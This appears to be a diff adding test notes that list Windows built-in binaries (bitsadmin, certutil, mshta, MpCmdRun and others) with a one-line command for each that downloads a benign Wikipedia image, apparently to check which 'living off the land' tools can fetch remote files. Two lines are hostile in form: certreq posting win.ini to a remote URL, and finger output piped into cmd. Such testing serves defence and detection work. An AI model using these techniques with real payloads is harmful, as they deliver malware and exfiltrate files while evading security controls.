@@ -1,0 +1,75 @@
+Bitsadmin:
+bitsadmin /transfer myDownLoadJob /download /priority normal https://learn.microsoft.com/en-us/sysinternals/media/index/sysinternals.png C:\Users\Jaro\Desktop\sysinternals.png
+
+certreq:
+certreq.exe -Post -config https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png C:\Windows\win.ini C:\Users\Jaro\Desktop\lolbas-download\certreq\sysinternals.png
+
+certutil:
+certutil.exe /urlcache /split /f https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png wiki-logo.png
+
+cmd.exe:
+type \\wikipedia\folder\wiki-logo.png > wikilogo.png
+
+ConfigSecurityPolicy.exe:
+ConfigSecurityPolicy.exe https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png
+
+esentutl.exe:
+esentutl.exe /y \\www.wikipedia.org\portal\wikipedia.org\assets\img\Wikipedia-logo-v2@1.5x.png /d C:\Users\Jaro\Desktop\lolbas-download\esentutl\Wikipedia-logo-v2@1.5x.png
+
+expand.exe:
+expand \\www.wikipedia.org\portal\wikipedia.org\assets\img\Wikipedia-logo-v2@1.5x.png C:\Users\Jaro\Desktop\lolbas-download\esentutl\Wikipedia-logo-v2@1.5x.png
+
+extrac32:
+extrac32 /Y /C \\www.wikipedia.org\portal\wikipedia.org\assets\img\Wikipedia-logo-v2@1.5x.png C:\Users\Jaro\Desktop\lolbas-download\extrac32\Wikipedia-logo-v2@1.5x.png
+
+findstr:
+findstr /V /L W3AllLov3LolBas \\www.wikipedia.org\portal\wikipedia.org\assets\img\Wikipedia-logo-v2@1.5x.png C:\Users\Jaro\Desktop\lolbas-download\findstr\Wikipedia-logo-v2@1.5x.png
+
+finger:
+finger: wikiuser@www.wikipedia.org | more +2 | cmd
+
+hh.exe:
+hh.exe https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png
+
+IMEWDBLD.EXE:
+C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png
+
+ieexec.exe:
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png
+
+InstallUtil.exe:
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png
+
+makecab.exe:
+makecab.exe \\www.wikipedia.org\portal\wikipedia.org\assets\img\Wikipedia-logo-v2@1.5x.png C:\Users\Jaro\Desktop\lolbas-download\makecab\Wikipedia-logo-v2@1.5x.cab
+
+MpCmdRun.exe:
+"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24060.7-0\MpCmdRun.exe" -DownloadFile -url https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png -path C:\Users\Jaro\Desktop\lolbas-download -path C:\Users\Jaro\Desktop\lolbas-download\mpcmdrun\Wikipedia-logo-v2@1.5x.png
+
+msedge:
+msedge.exe https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png
+
+mshta.exe:
+mshta.exe https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png
+
+ngen:
+ngen.exe https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png
+
+replace:
+replace \\www.wikipedia.org\portal\wikipedia.org\assets\img\Wikipedia-logo-v2@1.5x.png C:\Users\Jaro\Desktop\lolbas-download\replace\Wikipedia-logo-v2@1.5x.png
+
+msedge_proxy.exe:
+C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png
+
+scrobj.dll:
+rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png
+
+Shimgvw.dll:
+rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscree https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png
+
+Excel, msaccess, MsoHtmEd.exe, Powerpnt.exe, ProtocolHandler.exe:
+"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png
+
+msxsl.exe:
+msxsl.exe https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2@1.5x.png -o C:\Users\xxx
+
